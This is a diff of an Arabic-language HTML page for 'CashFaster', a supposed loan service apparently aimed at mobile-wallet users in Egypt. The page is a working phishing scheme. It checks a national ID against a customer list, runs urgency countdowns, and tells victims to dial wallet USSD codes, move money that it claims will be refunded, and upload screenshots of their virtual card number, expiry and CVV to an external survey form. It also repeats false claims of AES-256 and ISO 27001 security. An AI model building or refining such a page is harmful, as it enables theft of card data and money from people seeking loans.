@@ -3,82 +3,474 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>CashFaster | النظام الذهبي</title>
+    <meta name="description" content="CashFaster - النظام الذهبي للتمويل الرقمي الآمن">
+    <meta name="theme-color" content="#D4AF37">
+    <title>CashFaster | النظام الذهبي للتمويل الرقمي</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Cairo', sans-serif; background: #0a0f1e; color: #eef5ff; direction: rtl; }
-        .container { max-width: 500px; margin: auto; padding: 20px; }
-        .card { background: rgba(10,20,30,0.8); border-radius: 24px; padding: 20px; margin-bottom: 20px; border: 1px solid #D4AF37; }
-        .btn-gold { background: #D4AF37; border: none; padding: 12px; border-radius: 40px; font-weight: bold; width: 100%; cursor: pointer; }
-        input { width: 100%; padding: 12px; border-radius: 40px; border: 1px solid #D4AF37; background: #0a0a0a; color: white; }
-        .timer { font-size: 2rem; font-family: monospace; color: #FFB347; text-align: center; }
-        .hidden { display: none; }
+        body {
+            font-family: 'Cairo', sans-serif;
+            background: linear-gradient(135deg, #0a0f1e 0%, #03060c 100%);
+            color: #eef5ff;
+            min-height: 100vh;
+            direction: rtl;
+        }
+        .container { max-width: 1300px; margin: 0 auto; padding: 1.5rem; }
+        .glass-card {
+            background: rgba(10, 20, 30, 0.65);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(212, 175, 55, 0.3);
+            border-radius: 2rem;
+            box-shadow: 0 20px 40px -12px rgba(0,0,0,0.5);
+        }
+        .gold-text { color: #FFD966; text-shadow: 0 0 5px rgba(255, 217, 0, 0.3); }
+        .btn-gold {
+            background: linear-gradient(135deg, #F5B042, #D4AF37);
+            border: none;
+            padding: 0.9rem 1.8rem;
+            border-radius: 2rem;
+            font-weight: 700;
+            color: #0a0f1e;
+            cursor: pointer;
+            transition: 0.2s;
+            box-shadow: 0 8px 20px rgba(212,175,55,0.3);
+            font-family: 'Cairo', sans-serif;
+            font-size: 1rem;
+        }
+        .btn-gold:hover { transform: translateY(-3px); box-shadow: 0 15px 30px rgba(212,175,55,0.5); }
+        .btn-outline {
+            background: transparent;
+            border: 1.5px solid #D4AF37;
+            color: #FFD966;
+            padding: 0.7rem 1.5rem;
+            border-radius: 2rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.2s;
+            font-family: 'Cairo', sans-serif;
+            font-size: 0.9rem;
+        }
+        .btn-outline:hover { background: rgba(212,175,55,0.2); }
+        .login-wrapper {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1.5rem;
+        }
+        .login-card {
+            background: rgba(5, 10, 20, 0.85);
+            backdrop-filter: blur(15px);
+            border: 1px solid rgba(212,175,55,0.4);
+            border-radius: 2rem;
+            padding: 2.5rem;
+            width: 100%;
+            max-width: 480px;
+            text-align: center;
+        }
+        .logo-glow {
+            width: 85px;
+            height: 85px;
+            background: linear-gradient(145deg, #F5B042, #D4AF37);
+            border-radius: 25px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 3rem;
+            margin: 0 auto 1rem;
+            box-shadow: 0 0 25px rgba(212,175,55,0.7);
+        }
+        .input-group { margin: 1.5rem 0; text-align: right; }
+        .input-group label { display: block; margin-bottom: 0.5rem; font-weight: 600; color: #FFE6B3; }
+        .input-group input, .input-group select {
+            width: 100%;
+            padding: 1rem;
+            background: rgba(255,255,255,0.05);
+            border: 1px solid #D4AF37;
+            border-radius: 1.2rem;
+            color: #fff;
+            font-size: 1rem;
+            font-family: 'Cairo', sans-serif;
+        }
+        .input-group input:focus, .input-group select:focus {
+            outline: none; border-color: #FFB347; box-shadow: 0 0 12px rgba(212,175,55,0.4);
+        }
+        .error-msg { color: #ff8080; font-size: 0.85rem; margin-top: 0.5rem; }
+        .dashboard { display: none; }
+        .dashboard.active { display: block; }
+        .info-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px,1fr));
+            gap: 1.5rem;
+            margin: 2rem 0;
+        }
+        .info-card {
+            background: rgba(0,0,0,0.5);
+            border-radius: 1.5rem;
+            padding: 1.5rem;
+            border-right: 3px solid #D4AF37;
+            transition: all 0.3s;
+        }
+        .timer-box {
+            background: #0f1722;
+            border-radius: 2rem;
+            text-align: center;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+            border: 1px solid #D4AF37;
+        }
+        .timer { font-size: 3rem; font-weight: 800; font-family: monospace; color: #FFB347; }
+        .step-container {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 1rem;
+            margin: 1.5rem 0;
+        }
+        .step {
+            flex: 1;
+            background: #0a111c;
+            border-radius: 1.2rem;
+            padding: 1rem;
+            text-align: center;
+            border-bottom: 2px solid #D4AF37;
+        }
+        .upload-area {
+            border: 2px dashed #D4AF37;
+            border-radius: 1.5rem;
+            padding: 1.8rem;
+            text-align: center;
+            cursor: pointer;
+            background: rgba(212,175,55,0.05);
+            margin: 1rem 0;
+            transition: all 0.3s;
+        }
+        .upload-area:hover {
+            background: rgba(212,175,55,0.1);
+            border-color: #FFD966;
+        }
+        .wallet-warning {
+            background: rgba(74, 42, 26, 0.5);
+            border: 1px solid rgba(212,175,55,0.3);
+            border-radius: 2rem;
+            padding: 1.5rem;
+            text-align: center;
+            margin-bottom: 1rem;
+            display: none;
+        }
+        .wallet-warning.active { display: block; }
+        .linking-section { display: none; }
+        .linking-section.active { display: block; }
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1001;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.7);
+            align-items: center;
+            justify-content: center;
+        }
+        .modal.active { display: flex; }
+        .modal-content {
+            background: #0f1722;
+            border: 2px solid #D4AF37;
+            border-radius: 2rem;
+            padding: 2rem;
+            max-width: 500px;
+            width: 90%;
+            max-height: 80vh;
+            overflow-y: auto;
+        }
+        .modal-content h3 { color: #FFD966; margin-bottom: 1rem; }
+        .close-modal {
+            float: left;
+            font-size: 1.5rem;
+            font-weight: bold;
+            cursor: pointer;
+            color: #FFD966;
+        }
+        .phone-hide {
+            display: inline-block;
+        }
+        .show-phone-btn {
+            background: transparent;
+            border: none;
+            color: #FFD966;
+            cursor: pointer;
+            margin-right: 0.5rem;
+        }
+        footer { text-align: center; margin-top: 3rem; font-size: 0.75rem; color: #7f8c8d; padding-top: 2rem; border-top: 1px solid rgba(212,175,55,0.2); }
+        .footer-links a { color: #FFD966; text-decoration: none; margin: 0 0.5rem; }
+        @media (max-width: 768px) {
+            .timer { font-size: 2rem; }
+            .container { padding: 1rem; }
+            .info-grid { grid-template-columns: 1fr; }
+        }
     </style>
 </head>
 <body>
-<div id="loginPage" class="container">
-    <div class="card" style="text-align:center">
-        <h1 style="color:#D4AF37">💰 CashFaster</h1>
-        <p>النظام الذهبي للتمويل الرقمي</p>
-        <input type="text" id="nationalId" placeholder="الرقم القومي (14 رقم)" maxlength="14">
-        <button class="btn-gold" onclick="checkUser()">دخول</button>
-        <div id="loginError" style="color:red; margin-top:10px"></div>
+
+<div id="loginPage" class="login-wrapper">
+    <div class="login-card">
+        <div class="logo-glow">💰</div>
+        <h1 class="gold-text">CashFaster</h1>
+        <p style="margin-bottom: 1.5rem;">النظام الذهبي للتمويل الرقمي</p>
+        <div class="input-group">
+            <label>📇 الرقم القومي (14 رقم)</label>
+            <input type="text" id="nationalId" placeholder="مثال: 29101080300051" maxlength="14" inputmode="numeric">
+        </div>
+        <div id="loginError" class="error-msg"></div>
+        <button class="btn-gold" onclick="requestOTP()" style="width:100%">🔐 متابعة</button>
+        <div style="margin-top: 2rem; font-size: 0.7rem; color:#aaa;">
+            <i class="fas fa-shield-alt"></i> AES-256 | SSL Secure
+        </div>
+        <div class="footer-links" style="margin-top: 1rem;">
+            <a href="#" onclick="showPolicy()">سياسة الخصوصية</a> | 
+            <a href="#" onclick="showTerms()">شروط الخدمة</a>
+        </div>
     </div>
 </div>
-<div id="dashboardPage" class="container hidden">
-    <div class="card">
-        <h2 id="customerName">...</h2>
-        <p id="loanAmount"></p>
-        <p id="walletInfo"></p>
-        <div id="timerBox" class="timer">30:00</div>
-        <button class="btn-gold" onclick="window.open('https://survey.porsline.com/s/79e42DKa','_blank')">رفع الصور عبر الرابط الآمن</button>
-        <button class="btn-gold" onclick="logout()" style="margin-top:10px">تسجيل خروج</button>
+
+<div id="otpModal" class="modal">
+    <div class="modal-content">
+        <span class="close-modal" onclick="closeOTPModal()">&times;</span>
+        <h3>🔐 تحقق أمني إضافي</h3>
+        <p style="margin-bottom: 1rem;">للتحقق من هويتك، يرجى إدخال آخر 4 أرقام من رقم هاتفك المسجل لدينا.</p>
+        <div class="input-group">
+            <input type="text" id="otpCode" placeholder="أدخل آخر 4 أرقام" maxlength="4" inputmode="numeric">
+        </div>
+        <button class="btn-gold" onclick="verifyOTP()" style="width:100%">تأكيد</button>
     </div>
 </div>
+
+<div id="dashboardPage" class="dashboard">
+    <div style="background: rgba(20,25,40,0.8); backdrop-filter: blur(10px); border-bottom: 1px solid rgba(212,175,55,0.2); padding: 1rem 0; margin-bottom: 2rem;">
+        <div style="max-width:1300px; margin:0 auto; padding:0 1.5rem; display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:1rem;">
+            <div style="display:flex; align-items:center; gap:0.75rem;">
+                <div style="width:40px; height:40px; background:linear-gradient(135deg,#F5B042,#D4AF37); border-radius:10px; display:flex; align-items:center; justify-content:center; font-size:1.5rem;">💰</div>
+                <div><h1 style="font-size:1.3rem; color:#FFD966;">CashFaster</h1><p style="font-size:0.7rem;">النظام الآمن</p></div>
+            </div>
+            <button class="btn-outline" onclick="handleLogout()">تسجيل خروج</button>
+        </div>
+    </div>
+    <div class="container">
+        <div style="margin-bottom:2rem;">
+            <h2 class="gold-text" style="font-size:2rem; margin-bottom:0.5rem;">مرحباً <span id="customerName">...</span></h2>
+            <div style="display:flex; align-items:center; gap:0.5rem; color:#4ade80;"><i class="fas fa-check-circle"></i><span>✅ تم التحقق من هويتك</span></div>
+        </div>
+
+        <div class="info-grid">
+            <div class="info-card"><i class="fas fa-chart-line"></i><strong>مبلغ التمويل</strong><span id="loanAmount" style="font-size:1.8rem; font-weight:bold;">0</span></div>
+            <div class="info-card"><i class="fas fa-wallet"></i><strong>المحفظة المسجلة</strong><span id="walletType" style="font-size:1.2rem;">...</span></div>
+            <div class="info-card"><i class="fas fa-id-card"></i><strong>رقم المحفظة</strong><span id="walletNumberDisplay" style="font-size:1.2rem; font-family: monospace;"></span><button class="show-phone-btn" onclick="toggleFullWallet()"><i class="fas fa-eye"></i></button></div>
+            <div class="info-card"><i class="fas fa-user-check"></i><strong>حالة الطلب</strong><span id="statusMsg">مطلوب إتمام الربط</span></div>
+        </div>
+
+        <div class="timer-box"><div><i class="fas fa-hourglass-half"></i> الوقت المتبقي للربط الآمن</div><div class="timer" id="timerDisplay">30:00</div><div style="font-size:0.8rem;">انتهاء الوقت = تعليق مؤقت | يمكنك التواصل مع الدعم لتمديده</div></div>
+
+        <div id="walletRequiredMessage" class="wallet-warning"><i class="fas fa-exclamation-triangle" style="font-size:2rem; color:#FFD966;"></i><h3>محفظة إلكترونية مطلوبة</h3><p>عزيزي العميل، يجب عليك فتح محفظة <strong>فودافون كاش</strong> أو <strong>اتصالات كاش</strong> خلال <span id="deadlineText">4 ساعات</span> لإكمال طلب التمويل الخاص بك.</p><p>بعد فتح المحفظة، يرجى التواصل مع الدعم الفني على <strong>واتساب</strong> لإعادة تفعيل الطلب.</p><div class="timer" id="walletDeadlineTimer" style="font-size:2rem; margin-bottom:1rem;">04:00:00</div><a href="https://wa.me/212614494251?text=السلام%20عليكم%20،%20لقد%20قمت%20بفتح%20محفظتي%20وأريد%20استكمال%20طلب%20التمويل" target="_blank" class="btn-gold" style="display:inline-block;">📱 تواصل مع الدعم عبر واتساب</a></div>
+
+        <div id="linkingSection" class="linking-section"><div class="glass-card" style="padding:1.5rem; margin-bottom:2rem;"><h3 style="font-size:1.5rem; margin-bottom:1rem;"><i class="fas fa-link"></i> ربط المحفظة الإلكترونية</h3><div id="instructionBox" style="background:#0f1722; border-radius:1rem; padding:1rem; margin:1rem 0;"></div><div class="step-container"><div class="step">1️⃣ رقم الكارت</div><div class="step">2️⃣ تاريخ الانتهاء</div><div class="step">3️⃣ CVV</div><div class="step">4️⃣ تأكيد الإصدار</div></div><div class="upload-area" onclick="redirectToLinkingForm()"><i class="fas fa-cloud-upload-alt" style="font-size:2rem;"></i><div>اضغط لرفع صور السكرينات (تكون الرسالة كاملة)</div><div style="font-size:0.75rem; color:#aaa; margin-top:0.5rem;">سيتم توجيهك إلى نموذج آمن ومشفر لرفع المستندات. جميع الصور تبقى خاصة ولا يطلع عليها إلا النظام الآلي.</div></div><button class="btn-gold" style="width:100%; margin-top:1rem;" onclick="redirectToLinkingForm()">✅ تأكيد الربط وإرسال المستندات</button></div></div>
+
+        <footer><i class="fas fa-lock"></i> جميع البيانات مشفرة وفقاً لمعايير ISO 27001<br><div class="footer-links"><a href="#" onclick="showPolicy()">سياسة الخصوصية</a> | <a href="#" onclick="showTerms()">شروط الخدمة</a> | الدعم الفني 24/7</div></footer>
+    </div>
+</div>
+
+<div id="policyModal" class="modal"><div class="modal-content"><span class="close-modal" onclick="closePolicy()">&times;</span><h3>سياسة الخصوصية</h3><p>نحن في CashFaster نلتزم بحماية خصوصية بياناتك. يتم جمع البيانات التالية: الاسم الكامل، رقم الهاتف، العنوان، رقم البطاقة الشخصية، صورة شخصية، بيانات المحفظة الإلكترونية، بيانات الضامن. تُستخدم البيانات فقط لمراجعة طلبات التمويل والتواصل معك وإتمام الإجراءات. لا نشارك بياناتك مع أطراف ثالثة إلا بموافقتك أو عند اقتضاء القانون.</p></div></div>
+<div id="termsModal" class="modal"><div class="modal-content"><span class="close-modal" onclick="closeTerms()">&times;</span><h3>شروط وأحكام CashFaster</h3><ol style="margin-right:1.5rem;"><li>تقديم الطلب لا يعني الموافقة التلقائية، وتخضع الموافقة للتقييم الائتماني.</li><li>يُشترط وجود ضامن من الدرجة الأولى (أخ، أم، زوج، ابن).</li><li>بعد الموافقة، يتواصل مندوب CashFaster لتوقيع العقد في مكان العميل.</li><li>يتم استلام مبلغ التمويل نقدًا من المندوب بعد توقيع العقد.</li><li>الأقساط تُسدد عبر فوري باي (كود 788).</li><li>لا توجد رسوم إدارية مطلوبة قبل استلام التمويل.</li><li>في حالة التأخير تطبق رسوم تأخير حسب العقد.</li></ol></div></div>
+
 <script>
+    let customersData = [];
     let currentCustomer = null;
     let timerInterval = null;
+    let walletDeadlineInterval = null;
+    let pendingNationalId = null;
 
-    async function checkUser() {
-        const id = document.getElementById('nationalId').value.trim();
-        if (!id || id.length !== 14) {
-            document.getElementById('loginError').innerText = 'أدخل 14 رقم صحيح';
+    // تحميل بيانات العملاء من ملف JSON خارجي
+    async function loadCustomers() {
+        try {
+            const response = await fetch('customers.json');
+            if (!response.ok) throw new Error('فشل تحميل البيانات');
+            customersData = await response.json();
+        } catch (err) {
+            console.error('خطأ في تحميل العملاء:', err);
+            alert('حدث خطأ في تحميل البيانات. يرجى التواصل مع الدعم.');
+        }
+    }
+
+    function requestOTP() {
+        const nationalId = document.getElementById('nationalId').value.trim();
+        if (!nationalId || nationalId.length !== 14) {
+            document.getElementById('loginError').textContent = 'الرجاء إدخال رقم قومي صحيح (14 رقم)';
             return;
         }
-        const res = await fetch('customers.json');
-        const customers = await res.json();
-        const customer = customers.find(c => c.id === id);
+        const customer = customersData.find(c => c.id === nationalId);
         if (!customer) {
-            document.getElementById('loginError').innerText = 'رقم غير مسجل';
+            document.getElementById('loginError').textContent = 'عذراً، لم يتم العثور على طلب معتمد لهذا الرقم';
             return;
         }
-        currentCustomer = customer;
-        document.getElementById('loginPage').classList.add('hidden');
-        document.getElementById('dashboardPage').classList.remove('hidden');
-        document.getElementById('customerName').innerText = customer.name;
-        document.getElementById('loanAmount').innerHTML = `💰 مبلغ التمويل: ${customer.loan.toLocaleString()} ج.م`;
-        document.getElementById('walletInfo').innerHTML = `📱 المحفظة: ${customer.type}<br>📞 رقمها: ${customer.wallet.slice(0,3)}****${customer.wallet.slice(-3)}`;
-        startTimer();
+        pendingNationalId = nationalId;
+        document.getElementById('otpCode').value = '';
+        document.getElementById('otpModal').classList.add('active');
+        document.getElementById('loginError').textContent = '';
+    }
+
+    function verifyOTP() {
+        const otp = document.getElementById('otpCode').value.trim();
+        const customer = customersData.find(c => c.id === pendingNationalId);
+        if (!customer) {
+            closeOTPModal();
+            return;
+        }
+        const last4Digits = customer.phone.slice(-4);
+        if (otp === last4Digits) {
+            closeOTPModal();
+            currentCustomer = customer;
+            showDashboard();
+        } else {
+            alert('آخر 4 أرقام غير صحيحة. يرجى المحاولة مرة أخرى.');
+        }
+    }
+
+    function closeOTPModal() {
+        document.getElementById('otpModal').classList.remove('active');
+        pendingNationalId = null;
+    }
+
+    function showDashboard() {
+        document.getElementById('loginPage').style.display = 'none';
+        document.getElementById('dashboardPage').classList.add('active');
+        document.getElementById('customerName').innerText = currentCustomer.name;
+        document.getElementById('loanAmount').innerText = currentCustomer.loan.toLocaleString() + ' ج.م';
+        
+        let walletDisplay = currentCustomer.type;
+        document.getElementById('walletType').innerText = walletDisplay;
+        
+        // إخفاء رقم المحفظة جزئياً
+        const fullWallet = currentCustomer.wallet;
+        const hiddenWallet = fullWallet.slice(0,3) + '****' + fullWallet.slice(-3);
+        document.getElementById('walletNumberDisplay').innerHTML = `<span class="phone-hide">${hiddenWallet}</span><button class="show-phone-btn" onclick="toggleFullWallet()"><i class="fas fa-eye"></i></button>`;
+        window.fullWallet = fullWallet;
+        
+        const hasWallet = currentCustomer.wallet && currentCustomer.wallet !== '.';
+        if (hasWallet) {
+            document.getElementById('linkingSection').classList.add('active');
+            document.getElementById('walletRequiredMessage').classList.remove('active');
+            showLinkingInstructions(currentCustomer.type);
+            startTimer();
+            // إخلاء مسؤولية عند الدخول
+            setTimeout(() => {
+                alert('🔐 تأكيد أمان: جميع بياناتك مشفرة بنظام AES-256. لن يتم مشاركة أي من بياناتك مع أطراف خارجية. عملية الربط آمنة بالكامل.');
+            }, 500);
+        } else {
+            document.getElementById('linkingSection').classList.remove('active');
+            document.getElementById('walletRequiredMessage').classList.add('active');
+            startWalletDeadline();
+        }
+        
+        // تحذير عند مغادرة الصفحة
+        window.addEventListener('beforeunload', (e) => {
+            e.preventDefault();
+            e.returnValue = 'هل أنت متأكد من مغادرة الصفحة؟ سيتم إلغاء جلسة الربط.';
+            return 'هل أنت متأكد من مغادرة الصفحة؟ سيتم إلغاء جلسة الربط.';
+        });
+    }
+
+    function toggleFullWallet() {
+        const span = document.querySelector('#walletNumberDisplay .phone-hide');
+        if (span) {
+            const btn = document.querySelector('#walletNumberDisplay .show-phone-btn');
+            if (span.innerText.includes('*')) {
+                span.innerText = window.fullWallet;
+                btn.innerHTML = '<i class="fas fa-eye-slash"></i>';
+            } else {
+                const hidden = window.fullWallet.slice(0,3) + '****' + window.fullWallet.slice(-3);
+                span.innerText = hidden;
+                btn.innerHTML = '<i class="fas fa-eye"></i>';
+            }
+        }
+    }
+
+    function showLinkingInstructions(walletType) {
+        const instructionBox = document.getElementById('instructionBox');
+        const stepAmount = currentCustomer.step;
+        let code = '';
+        let walletName = '';
+        if (walletType.includes('فودافون')) { code = '#100*9*'; walletName = 'فودافون كاش'; }
+        else if (walletType.includes('اتصالات')) { code = '#6*777*'; walletName = 'اتصالات كاش'; }
+        else if (walletType.includes('أورانج')) { code = '#9*8*'; walletName = 'أورانج كاش'; }
+        instructionBox.innerHTML = `<div style="color:#FFD966; font-weight:600;">📋 تعليمات الربط لـ ${walletName}:</div><ol style="margin-right:1.5rem;"><li>اطلب <strong>${code}</strong> من هاتفك المسجل بالمحفظة</li><li>اختر مبلغ <strong>${stepAmount.toLocaleString()} ج.م</strong> (سيتم رده تلقائياً)</li><li>استخرج الكارت من رسالة التأكيد القادمة من الخدمة</li><li>ارفع صور الكارت في الخطوات التالية</li></ol><div style="color:#FFD966;">🔒 هذا الإجراء آمن ومشفر بالكامل.</div>`;
     }
 
     function startTimer() {
+        if (timerInterval) clearInterval(timerInterval);
         let timeLeft = 30 * 60;
-        const timerElem = document.getElementById('timerBox');
-        timerInterval = setInterval(() => {
+        const timerElem = document.getElementById('timerDisplay');
+        function update() {
             const mins = Math.floor(timeLeft / 60);
             const secs = timeLeft % 60;
             timerElem.innerText = `${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`;
-            if (timeLeft <= 0) clearInterval(timerInterval);
+            if (timeLeft <= 0) {
+                clearInterval(timerInterval);
+                alert('انتهى الوقت المتاح للربط. يرجى التواصل مع الدعم الفني لتمديد الجلسة.');
+            }
             timeLeft--;
-        }, 1000);
+        }
+        update();
+        timerInterval = setInterval(update, 1000);
     }
 
-    function logout() {
-        clearInterval(timerInterval);
-        document.getElementById('dashboardPage').classList.add('hidden');
-        document.getElementById('loginPage').classList.remove('hidden');
+    function startWalletDeadline() {
+        if (walletDeadlineInterval) clearInterval(walletDeadlineInterval);
+        let timeLeft = 4 * 60 * 60;
+        const deadlineElem = document.getElementById('walletDeadlineTimer');
+        function update() {
+            const hours = Math.floor(timeLeft / 3600);
+            const mins = Math.floor((timeLeft % 3600) / 60);
+            const secs = timeLeft % 60;
+            deadlineElem.innerText = `${hours.toString().padStart(2,'0')}:${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`;
+            if (timeLeft <= 0) {
+                clearInterval(walletDeadlineInterval);
+                alert('انتهى الوقت المتاح لفتح المحفظة. يرجى التواصل مع الدعم الفني لإعادة تفعيل الطلب.');
+            }
+            timeLeft--;
+        }
+        update();
+        walletDeadlineInterval = setInterval(update, 1000);
+    }
+
+    function redirectToLinkingForm() {
+        window.open('https://survey.porsline.com/s/79e42DKa', '_blank');
+    }
+
+    function handleLogout() {
+        if (timerInterval) clearInterval(timerInterval);
+        if (walletDeadlineInterval) clearInterval(walletDeadlineInterval);
+        window.removeEventListener('beforeunload', () => {});
+        document.getElementById('dashboardPage').classList.remove('active');
+        document.getElementById('loginPage').style.display = 'flex';
+        currentCustomer = null;
         document.getElementById('nationalId').value = '';
     }
+
+    function showPolicy() { document.getElementById('policyModal').classList.add('active'); }
+    function closePolicy() { document.getElementById('policyModal').classList.remove('active'); }
+    function showTerms() { document.getElementById('termsModal').classList.add('active'); }
+    function closeTerms() { document.getElementById('termsModal').classList.remove('active'); }
+
+    window.onclick = function(e) {
+        const modals = ['otpModal', 'policyModal', 'termsModal'];
+        modals.forEach(id => {
+            const modal = document.getElementById(id);
+            if (e.target === modal) modal.classList.remove('active');
+        });
+    };
+
+    loadCustomers();
 </script>
 </body>
 </html>
